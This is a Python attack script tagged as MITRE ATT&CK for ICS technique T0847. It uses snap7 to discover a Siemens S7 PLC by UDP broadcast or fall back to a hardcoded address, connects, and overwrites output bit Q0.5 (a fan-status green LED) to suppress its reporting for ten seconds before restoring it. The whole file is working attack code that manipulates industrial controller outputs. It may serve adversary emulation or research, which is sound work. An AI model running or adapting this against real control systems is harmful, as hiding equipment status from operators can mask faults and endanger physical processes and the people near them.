import snap7
import time
import socket

# MITRE ATT&CK Technique: Inhibit Response Function - Block Reporting Message (T0847)

def get_plc_ip_address():
    """
    Attempts to discover the PLC's IP address using a simple UDP broadcast.
    This assumes the PLC responds to a specific broadcast message.
    **This is a simplified example and may require adjustments for specific PLC configurations.**
    """
    broadcast_address = '255.255.255.255'
    broadcast_port = 5000  # Example port, adjust as needed

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    # Message to send to the PLC, adapt as needed.
    message = b"PLC_DISCOVERY"

    try:
        sock.sendto(message, (broadcast_address, broadcast_port))
        sock.settimeout(5)  # Wait for up to 5 seconds for a response

        data, addr = sock.recvfrom(1024)
        print(f"Received response: {data.decode()} from {addr[0]}")
        return addr[0] # Assume IP is returned from the PLC
    except socket.timeout:
        print("No response received from PLC.")
        return None
    finally:
        sock.close()


def inhibit_reporting(plc_ip, rack, slot, block_duration):
    """
    Inhibits reporting messages by setting the Q_GREENA output to 0 for a specified duration.
    This simulates blocking the "Fan A Green LED" reporting, indicating a healthy state.
    """
    plc = snap7.client.Client()

    try:
        plc.connect(plc_ip, rack, slot)
        print(f"Connected to PLC at {plc_ip}")

        # 1. Read the current state of Q0.5 (Q_GREENA)
        qb = bytearray(plc.read_area(snap7.const.S7AreaPQ, 0, 5, 1))  # Area PQ, DB number 0, start offset 5, size 1 byte
        original_value = bool(qb[0] & 0b00100000) # read the Q0.5 bit

        print(f"Original state of Q0.5 (Q_GREENA): {original_value}")

        # 2. Set Q0.5 (Q_GREENA) to 0
        qb[0] &= ~0b00100000  # Clear the bit at Q0.5
        plc.write_area(snap7.const.S7AreaPQ, 0, 5, qb) # write the changed byte

        print("Q0.5 (Q_GREENA) set to 0 - Reporting inhibited.")

        # 3. Wait for the specified duration
        time.sleep(block_duration)

        # 4. Restore the original state of Q0.5 (Q_GREENA)

        if original_value:  # If it was originally TRUE, set it back
            qb[0] |= 0b00100000  # Set the bit at Q0.5
        else: # If it was originally FALSE, make sure it's false
             qb[0] &= ~0b00100000 #Clear the bit at Q0.5

        plc.write_area(snap7.const.S7AreaPQ, 0, 5, qb) # write the changed byte

        print("Q0.5 (Q_GREENA) restored to its original state.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    plc_ip_address = get_plc_ip_address() #Attempt to autodiscover the PLC
    if plc_ip_address is None:
        #If discovery fails, fall back to a hardcoded default IP address
        plc_ip_address = "192.168.9.24"  # Default IP address if discovery fails

    RACK = 0
    SLOT = 1
    BLOCK_DURATION = 10  # seconds

    print(f"Using PLC IP Address: {plc_ip_address}")
    inhibit_reporting(plc_ip_address, RACK, SLOT, BLOCK_DURATION)